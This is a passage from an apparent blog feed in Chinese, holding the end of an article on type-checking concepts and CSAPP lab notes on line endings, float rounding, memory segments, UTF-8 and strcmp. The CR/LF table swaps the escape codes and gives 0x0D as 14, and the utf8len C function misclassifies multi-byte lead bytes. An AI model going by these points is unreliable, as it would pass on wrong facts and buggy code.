class="line">&lt;interactive&gt;:<span class="number">2</span>:<span class="number">9</span>:</span><br><span class="line">    <span class="type">Couldn&#x27;t</span> match expected <span class="class"><span class="keyword">type</span> `<span class="type">Int&#x27;</span> with actual <span class="keyword">type</span> `[<span class="type">Char</span>]&#x27;</span></span><br><span class="line">    <span class="type">In</span> the expression: <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br><span class="line">    <span class="type">In</span> an equation for `a&#x27;: a = <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><img src="/2021/weak-strong-static-dynamic-langs/1283539-31968e5f19abed4b.jpg" alt="img"></p><p>定义了一个某一个类型的数据，通常意味着以下三件事：</p><p>1，定义了一块某种结构的存储空间，用来存储这个数据；</p><p>2，特定类型意味可以对这块存储空间进行一些特定的操作；</p><p>3，声明了一个标识符（不严密的说就是变量名），作为操作这块数据的“标签”，之后可以通过这个标签操作这块数据，否则这块数据是无法使用的。</p><p>无论编译型语言还是解释型语言，这三点是共性。</p><p>若从程序出错的角度来解释这个问题，和类型有关的错误有：</p><p>1，访问了一个特定类型的标识符，但是访问的不是预期的存储空间。</p><p>2，对特定类型的标识符对应的数据，进行了非预期的操作。</p><p>为了防止与类型有关的错误发生，编程语言可以进行类型检查。</p><p>1、<strong>强类型检查</strong>与<strong>弱类型检查</strong>；</p><p>程序错误，大体上可分为可捕获错误<em>trapped errors</em> 和不可捕获错误<em>untrapped errors。</em> 可捕获错误<em>trapped errors</em> 发生时，程序停了下来，用户明确知道发生了错误；而不可捕获错误<em>untrapped errors</em>发生时，用户不知道错误的发生，程序的结果是否正确也无法判断，有可能造成重大损失。所以类型检查的目标，是：“捕获与类型有关的错误”。</p><p>所以，能保证不存在与类型有关的不可捕获错误的编程语言，可以称之为 具有<strong>强类型检查</strong>；反之称为 <strong>弱类型检查</strong>。</p><p>2、<strong>动态类型检查</strong>与<strong>静态类型检查</strong>；</p><p>普遍说法是<strong>静态类型检查</strong>是指在编译阶段进行的类型检查，动态类型检查是在执行阶段进行的类型检查。那么严格来说，解释性语言，并没有编译阶段。（虽然为了效率通常会转义成中间代码，这其中存在一些灰色地带，但是这个转义的过程，最基本的要求是对用户透明。）所以按”编译阶段”的说法，对于解释型语言，并不存在<strong>静态类型检查</strong>的概念。但是，许多解释型语言，现在往往可以通过外置的lint工具对脚本进行检查，这也是一种静态检查，但是已经不是语言本身的特性了。</p><p>对于编译型语言来说，可以在编译阶段进行<strong>静态类型检查</strong>，而且因为运行时库的存在，也可以在运行时进行<strong>动态类型检查。</strong></p><p>3、标识符<strong>动态类型绑定</strong>与<strong>静态类型绑定</strong>；</p><p>特定类型数据需要一个标识符（不严密的说就是变量名）与其绑定。这里面涉及的概念比较复杂：</p><ul><li><p>标识符与特定类型的数据绑定后，不允许解绑，那怕是解绑后重新绑定到同样类型的数据。</p></li><li><p>标识符与特定类型的数据绑定后，允许解绑，但是解绑后只允许重新绑定到同样类型的数据。</p></li><li><p>标识符与特定类型的数据绑定后，允许解绑，解绑后允许绑定到任意类型的数据。</p></li></ul><p>4、对于编译型语言，上述绑定，理论上可以发生在编译阶段，也可以发生在执行阶段。在执行阶段，变量名往往并不存在，存在的只是指针，这也是一种隐含的动态绑定，意味这一个指针指向了一个新的类型的数据空间，这有极大的便利性灵活性，也有极大的危险性。C语言看似非常“静态”，其实动态的一塌糊涂。</p><p>上述情况中的3，是通常意义上所说的动态类型绑定。动态类型绑定的主要问题是，同一个标识符的多次绑定，容易混淆本来的意义。动态绑定的表示符，往往通过推到来确定类型，这也会造成程序的可读性很差。</p><p>所以，为了搞清楚“弱类型、强类型、动态类型、静态类型”这四个提法，关键要这个提法就容易让人迷惑，不如搞清楚这三对概念：</p><p><strong>弱类型检查</strong> 与 <strong>强类型检擦</strong></p><p><strong>动态类型检查</strong> 与 <strong>静态类型检查</strong></p><p>标识符的 <strong>静态类型绑定</strong> 与 <strong>动态类型绑定</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/weak-strong-static-dynamic-langs/b0aeb7ffd1667b9162e5329154d43777_r.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计算机系统实验记录</title>
    <link href="https://www.fvolcano.red/2021/computer-architecture-hitlabs/"/>
    <id>https://www.fvolcano.red/2021/computer-architecture-hitlabs/</id>
    <published>2021-04-06T14:12:07.000Z</published>
    <updated>2021-04-06T14:12:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP经典实验个人解答，共八个。<a id="more"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_45406155">dream or nightmare博客</a></p><h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><ol><li>linux与windows下回车编码对比。</li></ol><ul><li><a href="https://www.jianshu.com/p/fd7822e69fea">Windows和Linux 行尾符(EndOfLine)的区别</a></li></ul><p>windows下默认编码 ANSI，linux默认utf-8。</p><h3 id="各系统关于行尾符（End-of-Line）的规定"><a href="#各系统关于行尾符（End-of-Line）的规定" class="headerlink" title="各系统关于行尾符（End-of-Line）的规定"></a>各系统关于行尾符（End-of-Line）的规定</h3><p>Unix每行结尾为”\n”</p><p>Windows系统每行结尾是“\r\n”</p><p>Mac OS在 OS X以前每行结尾是”\r”， 现在每行结尾是 “\n”</p><table><thead><tr><th>中文名</th><th>英文名</th><th>英文缩写</th><th>英文解释</th><th>C语言中表示</th><th>ASCII码</th></tr></thead><tbody><tr><td>回车</td><td>carriage return</td><td>CR</td><td>return</td><td>\n</td><td>0x0A (10)</td></tr><tr><td>换行</td><td>line feed</td><td>LF</td><td>new line</td><td>\r</td><td>0x0D (14)</td></tr></tbody></table><blockquote><p>在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行。这就是“换行”和“回车”的来历，从它们的英语名字上也可以看出一二。后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。</p></blockquote><p>结果是：Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。</p><p>在Windows系统中，文本文件以” \r\n”代表换行。用fputs等函数写换行符’\n’时，Windows会将’\n’隐式转换为”\r\n”，然后再写入到文件中。用fgets等函数读换行符’\n’的时候，Windows会将文件中的”\r\n”隐式转换为’\n’，然后再读到变量中。</p><ul><li>可以用linux命令实现转换：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> unix2dos filename</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dos2unix filename</span></span><br></pre></td></tr></table></figure><ul><li><p>一般在程序中, 写\n就可以了, 它在linux或windows中都能实现回车+换行的功能(只是在文本文件中, linux只会有0x0a, windows会自动换为0x0d 0x0a)。</p></li><li><p>在linux下使用%c会读到\n和\r两个字符。所以需要将^M（也就是\r）字符删掉。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat a.txt | tr -d <span class="string">&quot;^M&quot;</span> &gt; b.txt</span></span><br></pre></td></tr></table></figure><ol start="2"><li>解释现象。</li></ol><p><img src="/2021/computer-architecture-hitlabs/1.png"></p><p><img src="/2021/computer-architecture-hitlabs/2.png"></p><p>原因：</p><p>第一组数据：输入和输出不一致是因为单精度浮点数在IEEE规定下的表示造成的。第一组数据在二进制数表示下为无循环的小数，由于float数据类型只能存储23位小数，为数后面的数都会被截断而且会向偶数进行舍入，因此有的数据进行舍入时会改变运行结果，所以第一组数据存在一些数据发生结果改变.</p><p>第二组数据：由第一组数据中的分析可知，第二组数据在进行偶数舍入的情况下并没有发生结果的改变，因此运行结果和数据输入的内容相同相同。</p><p>使用浮点数应注意：float单精度浮点数在计算机存储大多是近似值，无法精确表示准确数值。因此最好不要对float单精度浮点数进行比较的运算。如果想要更高精度的数据表示可以选择使用double双精度浮点数的类型或者用数组按位表示。</p><ol start="3"><li>查看各数值的内存中十六进制存储。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *byte_pointer;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(byte_pointer start, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">size_t</span> i;</span><br><span class="line">true<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">truetrue<span class="built_in">printf</span>(<span class="string">&quot;%.2x&quot;</span>, start[i]);</span><br><span class="line">true&#125;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">trueshow_bytes((byte_pointer)&amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li><p>学会如何使用linux的命令行，使用一些简单的命令代替图形界面操作。</p></li><li><p>学会在命令行完整写出一个c程序，用vim编辑，gcc编译。</p></li><li><p>了解在windows和linux平台下如何配置C编译环境。</p></li><li><p>复习了C相关知识点，编写了几个简单程序。</p></li><li><p>了解了windows 和 linux 的硬件信息。</p></li></ol><h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><h2 id="debug-with-gdb-amp-objdump"><a href="#debug-with-gdb-amp-objdump" class="headerlink" title="debug with gdb &amp; objdump"></a>debug with gdb &amp; objdump</h2><ol><li><p><a href="https://www.howtoforge.com/linux-objdump-command/">Linux objdump Command Explained for Beginners (7 Examples)</a></p></li><li><p><a href="https://www.howtoforge.com/tutorial/how-to-debug-c-programs-in-linux-using-gdb/">How to debug C programs in Linux using gdb</a></p></li><li><p><a href="https://linux.die.net/man/1/gcc">gcc man page</a></p></li><li><p><a href="https://developer.ibm.com/technologies/linux/articles/l-gdb/">Linux software debugging with GDB</a></p></li><li><p><a href="https://www.bytesnap.com/how-to-debug-your-linux-application-debugging-by-printf/#">How to debug your Linux Application: Debugging by printf</a></p></li><li><p><a href="http://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html">gdb Debugging Full Example (Tutorial): ncurses</a></p></li><li><p><a href="https://www.youtube.com/watch?v=-n9Fkq1e6sg&list=PLHTh1InhhwT7J5jl4vAhO1WvGHUUFgUQH&index=41&ab_channel=CppCon">CppCon 2016: Greg Law “GDB - A Lot More Than You Knew”</a></p></li></ol><h2 id="不同类型值存储位置"><a href="#不同类型值存储位置" class="headerlink" title="不同类型值存储位置"></a>不同类型值存储位置</h2><p><a href="https://blog.csdn.net/handsome_bear/article/details/102970573">const、static变量存储位置</a></p><p>①static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放。</p><p>②<strong>const全局变量</strong>存储在只读数据段，编译期最初将其保存在符号表中，第一次使用时为其分配内存，在程序结束时释放；<strong>const局部变量</strong>存储在栈中，代码块结束时释放。</p><p>③全局变量存储在全局/静态区域，在编译期为其分配内存，在程序结束时释放。</p><p>④局部变量存储在栈中，代码块结束时释放。</p><p>注：当全局变量和静态局部变量未赋初值时，系统自动置为0。但未初始化全局变量为弱类型，可能会改变为引用其他可重定位模块内的同名变量。</p><p>例、</p><p>x ：全局  .data</p><p>y ：局部  stack</p><p>z ：局部char*  .text</p><p><img src="/2021/computer-architecture-hitlabs/6.png"></p><p><img src="/2021/computer-architecture-hitlabs/8.png" alt="各段地址区域"></p><p>x 与 z 都是通过与当前指令指针偏移量来定位其在内存中的位置，而存在stack中的y是通过 基址寄存器 rbp 来定位。</p><p><img src="/2021/computer-architecture-hitlabs/7.png" alt="汇编代码看数据访问方式"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ol><li>源程序的编码：和OS、编辑器、编译器相关，Linux / windows/Mac 下的编码与回车处理不同，所以不同编码在不正确的使用环境下可能有编译以及错误输出。<br>分析验证：VS/CB/GCC下不同源程序编码是怎么处理的？</li></ol><ol start="2"><li><strong>深入研究Unicode标准和UTF-8编码</strong></li></ol><ul><li><p><a href="https://www.bilibili.com/video/BV1gZ4y1x7p7">非常详细的字符编码讲解，ASCII、GB2312、GBK、Unicode、UTF-8等知识点都有</a></p></li><li><p>GB2312为什么要加上0xA0：GB2312 是双字节编码，为了与 ASCII 码区分开，字节的第8位必须是1，所以至少要从 0x80(128, 1000 0000) 开始吧，但是根据上面的规定，0x80 - 0x9f 要留给控制块，所以只能从 0xA0 开始咯。那为什么 GB2312 编码不是从 0xA0 开始，而是 0xA1 开始呢？ 因为 0xA0 正好是图形块的空格，所以就从 0xA1 开始编码。</p></li><li><p><a href="https://www.youtube.com/watch?v=I-pQH_krD0M&ab_channel=ComputerScience">ASCII and Unicode Character Sets</a></p></li><li><p><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">字符编码笔记：ASCII，Unicode 和 UTF-8 - 阮一峰</a></p></li><li><p><a href="http://cenalulu.github.io/linux/character-encoding/">十分钟搞清字符集和字符编码</a></p></li><li><p><a href="https://www.zhihu.com/question/52346583">长文答案-知乎unicode与utf-8</a></p></li><li><p><a href="https://www.cnblogs.com/54chensongxia/p/11650841.html">编码问题：基础概念与延伸</a></p></li><li><p><a href="https://www.zhihu.com/question/20650946">Windows 记事本的 ANSI、Unicode、UTF-8 这三种编码模式有什么区别？</a> (混乱程度可见一斑)</p></li><li><p><a href="https://www.cnblogs.com/malecrab/p/5300486.html">ANSI是什么编码？</a></p></li><li><p><a href="https://www.codenong.com/cs105965196/">名词解释：Unicode、UCS-2/4、UTF-8/16/32、GB2312、GBK</a></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Unicode符号范围         |        UTF<span class="number">-8</span>编码方式</span><br><span class="line">   (十六进制)           |         （二进制）</span><br><span class="line">-----------------------+---------------------------------------------</span><br><span class="line"><span class="number">0000</span> <span class="number">0000</span><span class="number">-0000</span> <span class="number">007</span>F    |        <span class="number">0</span>xxxxxxx</span><br><span class="line"><span class="number">0000</span> <span class="number">0080</span><span class="number">-0000</span> <span class="number">07</span>FF    |        <span class="number">110</span>xxxxx <span class="number">10</span>xxxxxx</span><br><span class="line"><span class="number">0000</span> <span class="number">0800</span><span class="number">-0000</span> FFFF    |        <span class="number">1110</span>xxxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx</span><br><span class="line"><span class="number">0001</span> <span class="number">0000</span><span class="number">-0010</span> FFFF    |        <span class="number">11110</span>xxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx <span class="number">10</span>xxxxxx</span><br></pre></td></tr></table></figure><p>UTF16编码是Unicode最直接的实现方式，通常我们在windows上新建文本文件后保存为Unicode编码，其实就是保存为UTF16编码。</p><ol start="3"><li><strong>C语言处理utf-8文本</strong></li></ol><ul><li><a href="https://segmentfault.com/a/1190000004274760">在 C 程序中处理 UTF-8 文本</a></li></ul><p>打印数据的字节（十六进制）表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先取数据地址，转换成单字节长度的类型（unsigned char）的指针，</span></span><br><span class="line"><span class="comment">// 然后按照十六进制逐字节打印即可，格式为“%.2x”。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i));</span><br></pre></td></tr></table></figure><p>utf8len：计算utf8编码的字符串的个数。</p><p>！错误：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210416204335280.png" alt="image-20210416204335280"></p><ul><li><p>比较时应该为二进制，而写成了0x十六进制，C没有二进制的直接表示，将之转化为十六进制写入。</p></li><li><p>byte &amp; 1000 0000 == 0 却不进入分支?<br>优先级问题。</p></li></ul><p><img src="/2021/computer-architecture-hitlabs/image-20210416210130066.png" alt="image-20210416210130066"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8len</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//      unsigned char c1 = 1 &lt;&lt; 7;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c2 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c3 = <span class="number">7</span> &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c4 = <span class="number">15</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">char</span> byte = *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i);</span><br><span class="line">                <span class="keyword">if</span>(byte &lt;= <span class="number">0x7F</span>) &#123;</span><br><span class="line">                        <span class="comment">// 0xxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c2) == <span class="number">0x40</span>) &#123;</span><br><span class="line">                        <span class="comment">// 110x xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c3) == <span class="number">0x60</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1110 xxxx  xxxx xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i += <span class="number">2</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byte &amp; c4) == <span class="number">0x70</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1111 0xxx  xxxx xxxx  xxxx xxxx  xxxx xxxx</span></span><br><span class="line">                        num++;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *str = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)(str + i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> len = utf8len(str);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The number of characters is %d\n&quot;</span>, len);</span><br><span class="line">        <span class="built_in">free</span>(str);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/computer-architecture-hitlabs/image-20210416210258729.png" alt="image-20210416210258729"></p><ol start="4"><li><strong>字符串比较函数 strcmp() 对中文的处理</strong></li></ol><p><img src="/2021/computer-architecture-hitlabs/image-20210417075647150.png" alt="image-20210417075647150"></p><p>strcmp() 源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">strcmp</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * src, <span class="keyword">const</span> <span class="keyword">char</span> * dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">while</span>( ! (ret = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src - *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)dst) &amp;&amp; *dst)</span><br><span class="line">                ++src, ++dst;  </span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">           ret = <span class="number">-1</span> ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ret &gt; <span class="number">0</span> )</span><br><span class="line">           ret = <span class="number">1</span> ;</span><br><span class="line">    <span class="keyword">return</span>( ret );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中文比较实际上也是比较字符在计算机中存储的01，而字符的01是由字符集与字符编码共同决定的，编码字符集Unicode，有UTF-8、UTF-16、UTF-32等多种字符编码；编码字符集ASCII，本身就是编码字符集，又是字符编码；编码字符集CB2312，只有EUC-CN一种字符编码，以下以utf-8为例。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210417080821157.png" alt="unicode中文范围"></p><p>在linux中，默认使用的编码方式是不带BOM的UTF-8，则汉字的存储顺序是基本按照汉字字符在Unicode中的码点值(code point)来决定的。</p><ul><li><a href="https://www.cnblogs.com/huahuahu/p/Unicode-zi-fu-chuan-pai-xu-gui-ze-yi-ru-he-que-din.html">Unicode 字符串排序规则（一）：如何确定单个字符的顺序</a></li><li><a href="https://www.cnblogs.com/huahuahu/p/Unicode-zi-fu-chuan-pai-xu-gui-ze-er-ru-he-bi-jiao.html">Unicode 字符串排序规则（二）：如何比较字符串</a></li><li><a href="https://www.unicode.org/charts/rs.pdf">官方文档 简</a>      <a href="http://www.unicode.org/versions/Unicode13.0.0/ch18.pdf">官方文档 详</a></li><li><a href="https://www.unicode.org/reports/tr38/">UNICODE HAN DATABASE (UNIHAN)</a></li><li><a href="https://zhuanlan.zhihu.com/p/50380852">深入理解苹果系统（Unicode）字符串的排序方法</a></li></ul><p>Unicode Collation Algorithm (UCA) 是 Unicode 制定的如何比较两个 Unicode 字符串的规范。UCA指定了默认情况下 Unicode 字符的顺序。但是这仅仅是默认情况，也就是照顾了大多数情况（也就是排序对英语国家比较友好）。对于其他地区的人们来说，就需要输入和默认情况不同的数据，以获得和当地习惯相符合的结果。比如同样的汉字，在中国大陆是按照汉语拼音排序的，在香港就是按照笔画数目排序的，笔画排序的依据主要是康熙字典第七版。</p><p>Common Locale Data Repository (CLDR)，从名字上可以看出，这个实际上是一堆数据的仓库。对于指定的地区 (locale)，可以从中找到指定的数据。再结合 UCA，就可以得到符合当期习惯的排序结果。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210417101024600.png"></p><p>中国大陆使用unicode实际上是首先按照拼音排序，表现为不同行之间的顺序。对于同音字，也就是每一行之间的顺序，先按照笔画数排序，再按照<code>kRSUnicode</code>排序。</p><h2 id="数据变换与输入输出"><a href="#数据变换与输入输出" class="headerlink" title="数据变换与输入输出"></a>数据变换与输入输出</h2><ol><li><strong>printf 与 scanf 的实现</strong></li></ol><p><a href="https://blog.csdn.net/u010125463/article/details/46522587">浅析Scanf源码</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><a href="https://blog.csdn.net/rakish_wind/article/details/81433679">gets（）函数与scanf（）函数对读取字符串的区别之处</a></li></ol><p>gets()：可接受带空格的字符串，回车终止，在字符串末尾补’\0’，会从输入缓存区中吸收回车，可接受空字符串。</p><p>（PS：puts（）输出字符串时会自动加上换行。）</p><p>scanf()：%s吸收字符串时，不吸收空白符，遇见空白符停止吸收，在字符串末尾补’\0’，并且scanf（）吸收字符时会自动略过开头的空白符，直至遇见一个非空白符才开始它的吸收过程。</p><ul><li><a href="https://www.cnblogs.com/52php/p/5724372.html">C中各input函数用法</a></li></ul><ol start="3"><li><strong>编写函数cs_atoi/cs_atof  （字符串转正数/浮点数）</strong><br>字符串限定为十进制，处理效果同scanf</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span 